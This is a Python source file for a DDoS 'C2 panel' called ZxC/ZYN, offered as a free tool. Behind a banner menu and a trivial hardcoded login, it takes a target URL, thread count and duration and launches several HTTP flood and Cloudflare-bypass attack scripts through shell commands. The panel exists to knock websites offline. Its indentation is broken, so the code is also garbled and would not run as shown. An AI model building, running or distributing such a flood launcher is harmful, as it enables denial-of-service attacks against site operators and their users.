import os
import sys
import time
import requests
import random
import getpass
import socket

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)


def layer7():
    clear()
    print(f'''
                              \x1b[38;2;102;255;255m╔═════\x1b[38;2;178;102;255m══════\x1b[38;2;255;102;255m════╗
                              \x1b[38;2;102;255;255m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;255;102;255m║
               \x1b[38;2;102;255;255m╔══════════════╩═════\x1b[38;2;178;102;255m═══╦══\x1b[38;2;255;102;255m════╩══════════════╗
               \x1b[38;2;102;255;255m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;178;102;255m║   \x1b[38;2;0;255;255muambyp            \x1b[38;2;255;102;255m║
               \x1b[38;2;102;255;255m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;178;102;255m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;255;255;255m║
               \x1b[38;2;102;255;255m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;178;102;255m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;255;255;255m║
               \x1b[38;2;102;255;255m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;178;102;255m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;255;255;255m║
               \x1b[38;2;102;255;255m╚════════════════════\x1b[38;2;178;102;255m═══╩══\x1b[38;2;255;102;255m═══════════════════╝
''')

def menu():
  clear()
  print(f'''
                        \x1b[38;2;102;255;255m╔═╗ \x1b[38;2;178;102;255m ═╗ ╦  ╔═\x1b[38;2;255;102;255m╗  ╔╦╗ \x1b[38;2;102;255;255m ╔╦╗ \x1b[38;2;178;102;255m ╔═╗ \x1b[38;2;255;102;255m ╔═╗
                        \x1b[38;2;102;255;255m╔═╝ \x1b[38;2;178;102;255m ╔╩╦╝  ║ \x1b[38;2;255;102;255m    ║║ \x1b[38;2;102;255;255m  ║║ \x1b[38;2;178;102;255m ║ ║ \x1b[38;2;255;102;255m ╚═╗
                        \x1b[38;2;102;255;255m╚═╝ \x1b[38;2;178;102;255m ╩ ╚═  ╚═\x1b[38;2;255;102;255m╝  ═╩╝ \x1b[38;2;102;255;255m ═╩╝ \x1b[38;2;178;102;255m ╚═╝ \x1b[38;2;255;102;255m ╚═╝
                \x1b[38;2;102;255;255m╔═══════════\x1b[38;2;178;102;255m════════\x1b[38;2;255;102;255m═══════\x1b[38;2;102;255;255m═════\x1b[38;2;178;102;255m═════\x1b[38;2;255;102;255m══════════╗
                \x1b[38;2;102;255;255m║          \x1b[38;2;239;239;239mWelcome to ZxC C2 DDoS Panel        \x1b[38;2;255;102;255m║
                \x1b[38;2;102;255;255m║ \x1b[38;2;255;102;255m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;102;255;255m- - - - - - -\x1b[38;2;255;102;255m║
                \x1b[38;2;102;255;255m╚═══════════\x1b[38;2;178;102;255m════════\x1b[38;2;255;102;255m═══════\x1b[38;2;102;255;255m═════\x1b[38;2;178;102;255m═════\x1b[38;2;255;102;255m══════════╝
                    \x1b[38;2;102;255;255m╔═══════\x1b[38;2;178;102;255m════════\x1b[38;2;255;102;255m═══════\x1b[38;2;102;255;255m═════\x1b[38;2;178;102;255m═════\x1b[38;2;255;102;255m══════╗
                    \x1b[38;2;102;255;255m║ \x1b[38;2;239;239;239mhttps://github.com/vksoz/x           \x1b[38;2;255;102;255m║
                    \x1b[38;2;102;255;255m╚═══════\x1b[38;2;178;102;255m════════\x1b[38;2;255;192;255m═══════\x1b[38;2;102;255;255m═════\x1b[38;2;178;102;255m═════\x1b[38;2;255;102;255m══════╝
                \x1b[38;2;102;255;255m╔═══════════\x1b[38;2;178;102;255m════════\x1b[38;2;255;192;255m═══════\x1b[38;2;102;255;255m═════\x1b[38;2;178;102;255m═════\x1b[38;2;255;102;255m══════════╗
                \x1b[38;2;102;255;255m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;255;102;255m║
                \x1b[38;2;102;255;255m╚═══════════\x1b[38;2;178;102;255m════════\x1b[38;2;255;102;255m═══════\x1b[38;2;102;255;255m═════\x1b[38;2;178;102;255m═════\x1b[38;2;255;102;255m══════════╝  
  
  
  ''')

def main():
  menu()
  while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@Z\x1b[38;2;0;150;88mY\x1b[38;2;0;113;133mN\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()

#L7 Methods

elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')

 elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

elif "uambyp" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')



elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

def login():
    clear()
    user = "1"
    passwd = "1"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Retry Password")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to ZYN C2!")
        time.sleep(0.3)
        main()

login()

              
